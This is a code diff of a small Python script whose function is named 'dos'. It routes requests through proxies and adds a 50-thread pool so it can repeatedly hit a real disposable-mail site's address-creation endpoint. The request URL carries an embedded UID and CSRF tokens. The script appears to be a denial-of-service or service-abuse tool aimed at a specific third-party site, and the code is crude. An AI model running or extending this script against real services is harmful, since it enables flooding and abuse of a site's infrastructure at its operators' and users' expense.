@@ -1,5 +1,6 @@
 #+++++++++++"IMPORT"++++++++++++++++++
 import requests
+from concurrent.futures import ThreadPoolExecutor
 import tkinter
 import os
 import urllib.request
@@ -32,11 +33,14 @@ def dos():
     'https': f"https://{t}"
   }
   try:
-    a=requests.get("m.kuku.lu",proxies=proxies,timeout=(3.0, 7.5))
+    a=requests.get(r"https://m.kuku.lu/index.php?action=addMailAddrByOnetime&nopost=1&by_system=1&UID_enc=TgvNkh7MalEAto068Nl3R8NUKnSRogeCMR586%2BRoNYaDbe3EtO232e2vROGBAj6T&csrf_token_check=3c2953cfb49838d76cead78bfc038231&csrf_subtoken_check=7777bd07d58cdccef911b5fe46256184&recaptcha_token=&_=1644483113955",proxies=proxies,timeout=(3.0, 7.5))
     status=a.status_code
+    print(f"[+]{t} --{status}")
   except:
-    print("miss")
-  
-dos()
+    print(f"[-]{t}")
+    
+def threadproxy():
+    with ThreadPoolExecutor(max_workers = 50) as thread:
+      thread.submit(dos)
 
-
+threadproxy()
